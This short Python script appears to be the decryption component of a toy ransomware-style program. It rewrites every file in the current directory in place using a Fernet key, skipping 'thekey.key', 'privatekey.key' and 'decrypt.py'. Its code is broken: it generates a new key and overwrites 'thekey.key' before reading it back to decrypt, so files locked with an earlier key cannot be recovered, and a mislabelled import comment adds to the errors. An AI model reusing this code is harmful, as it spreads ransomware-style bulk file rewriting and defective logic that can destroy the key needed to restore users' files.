# import the Fernet module from the cryptography library
import os
from cryptography.fernet import Fernet

# generate a new key
key = Fernet.generate_key()

# print the key
print(key)

# write the key to a file named "thekey.key" in binary mode
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

# ------- DECRYPTION --------

files = []

# loop through the files in the current directory
for file in os.listdir():
    if file == "thekey.key" or file == "privatekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

# print the list of files to be decrypted
print(files)

with open("thekey.key", "rb") as key_file:
    secret_key = key_file.read()

    # loop through the files and decrypt each file
    for file in files:
        with open(file, "rb") as encrypted_file:
            # read the contents of the file
            contents = encrypted_file.read()
            # decrypt the contents using the secret key
            contents_decrypted = Fernet(secret_key).decrypt(contents)
            # open the file in binary write mode
            with open(file, "wb") as decrypted_file:
                decrypted_file.write(contents_decrypted)
